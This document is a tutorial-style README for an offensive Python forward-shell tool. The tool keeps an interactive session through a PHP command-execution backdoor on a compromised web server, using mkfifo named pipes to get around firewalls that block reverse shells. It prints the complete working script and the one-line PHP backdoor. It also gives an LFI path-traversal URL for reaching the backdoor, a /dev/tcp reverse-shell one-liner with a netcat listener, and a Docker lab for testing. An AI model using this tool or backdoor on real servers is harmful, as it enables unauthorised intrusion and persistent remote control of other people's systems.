## Intro

This is a script created by `@savitar` (Marcelo Vazquez) on his course "Python ofensivo", but refactorized and simplified by me (shrinked more than 60% 
but working the same)
 
It uses the "Mkfifo Named Pipes" in order to maintain a context in the remote command execution gained throught a php backdoor  
`<?php system($_GET['cmd']); ?>`  that we have to upload previously on a compromised web-server. 

It's for wervsers that doeesn't allow us to gain a reverse shell due to firewall implementations.

Usage (example)
```bash
$: python3 mkfifo_shell.py -u http://compromised_server/image=../../../../../var/www/html/uploads/backdoor.php -p cmd
[*] Setting up the shell: 
>> whoami
www-data
```

-----------------

## Script

```python
#!/usr/bin/env python3
import requests, sys, signal, time, argparse
from termcolor import colored as color
from base64 import b64encode
from random import randrange

def get_arguments():
    parser = argparse.ArgumentParser(description='### Forward Shell based on mkfifo named pipes ###')
    parser.add_argument("-u", "--url", dest="url", help='Vulnerable url "http://web/uploads/backdoor.php"')
    parser.add_argument("-p", "--param", dest="param", help='Backdoor`s GET parameter "?cmd=whoami" -> "cmd"')
    options = parser.parse_args() 
    if options.url is None or options.param is None: 
        parser.print_help(); sys.exit(1)     
    return options.url, options.param

def def_handler(sig, frame):
    print(color("[*] Saliendo...", 'yellow')); remove_data(); sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

def run_cmd(cmd):
    data = { param: f'echo "{b64(cmd)}" | base64 -d | /bin/sh'}
    try:
        req = requests.get(url, params=data, timeout=5)
        return req.text
    except:
        pass
    return None

session = randrange(1000,9999); stdin = f"/dev/shm/{session}.input"; stdout = f"/dev/shm/{session}.output"
b64 = lambda cmd: b64encode(cmd.encode()).decode() 
remove_data = lambda: run_cmd(f"/bin/rm {stdin} {stdout}")
setup_shell = lambda: run_cmd(f"mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout}")
clear_stdout = lambda: run_cmd(f"echo '' > {stdout}")
read_stdout = lambda: [run_cmd(f"/bin/cat {stdout}") for _ in range(5)][-1]
write_stdin = lambda cmd: requests.get(url, params={ param : f'echo {b64(cmd)} | base64 -d > {stdin}'})

url, param = get_arguments(); print(color("[*] Setting up the shell: ", 'yellow')); setup_shell()
while True:
    cmd = input(color(">> ", 'yellow')); write_stdin(cmd + "\n")
    print(read_stdout()); clear_stdout()
```

----------------------------------------

## Mkfifo theory

We can compromise a machine uploading a php backdoor and triggering a reverse shell command like `bash -c "bash -i >& /dev/tcp/<kali_ip>/443 0>&1`
but after executing a netcat listener `nc -nlvp 443`, we dont recieve a reverse shell. 

Why? Maybe there is a firewall that blocks reverse connections or pings, so we can't either ping our kali `ping -c i <kali_ip>`. 
But we still can execute some commands on the machine. ¿What to do now? Create a python seudoshell script that executes commands within the backdoor.

In order to maintain kind of a session (have continuity like changing directory from `/var/www/html` to whatever we want), we have to use the 
mkfifo Linux named pipes.

```bash
$: mkfifo input; tail -f input | /bin/sh 2>&1 > output
```
- Create tha `input` file, a named pipe. We read it from it constantly with `tail -f`, and executing everything we read with `/bin/sh 2>&1`, printing either the `stdout` and `stderr` to the `output` file. So we have to read the `output` file

```bash
$: echo "cd /" > input
$: echo "pwd" > input;
$: cat output 
"/"
```
Executing commands this way, allows you to maintains the same session, the same context.

----------------------------------------

## The backdoor

1. First of all, to use this tool, we need to create a simple php backdoor like this: `<?php system($_GET['cmd']); ?>`   
2. Then, we have to upload it into the web server and acess it throught the path in wich it is located, for example with a LFI like for example
`http://vulnerable_server/image=../../../../../var/www/html/uploads/backdoor.php`
3. And then pass it a command with the GET parameter (in this case, "cmd"):
`curl -s -X GET http://compromised_server/image=../../../../../var/www/html/uploads/backdoor.php?cmd=whoami  -> www-data`

----------------------------------------

## Docker container to test the tool

We can create a php web server with Docker in wich we can prove this tool.

1. First we create the `index.php` the root file of the web-server and it is the single line php backdoor `<?php system($_GET['cmd']); ?>`   
2. Create the `Dockerfile`. We are creating a simple apache webserver that runs "php 7.0". We copy the `index.php` and make the http port accesible.
```bash
FROM php:7.0-apache
COPY index.php /var/www/html/
EXPOSE 80
```
3. Then we create the container, called `webserver` based on the `Dockerfile`, so run `docker build . -t webserver` 
4. Then `docker run --rm -dit -p 80:80 webserver`, so the container, will erase after finishing (`--rm`), will share host's 80 port. Will be running in background, with an interactive pseudoterminal (`--dit`) and its based on `webserver`
5. We can check the container with 
```bash
$: docker ps -a                           
CONTAINER ID   IMAGE       COMMAND                  CREATED          STATUS          PORTS                               NAMES
ac351ca7d9aa   webserver   "docker-php-entrypoi…"   18 seconds ago   Up 16 seconds   0.0.0.0:80->80/tcp, :::80->80/tcp   reverent_shirley
$: docker exec -it reverent_shirley bash
root@ac351ca7d9aa:/var/www/html# hostname -I
172.17.0.2
```
6. So we can test the tool against that container with the params:
```bash
$: python3 Mkfifo_shell.py -u http://172.17.0.2/index.php -p cmd
[*] Setting up the shell: 
>> hostname -I
172.17.0.2 
```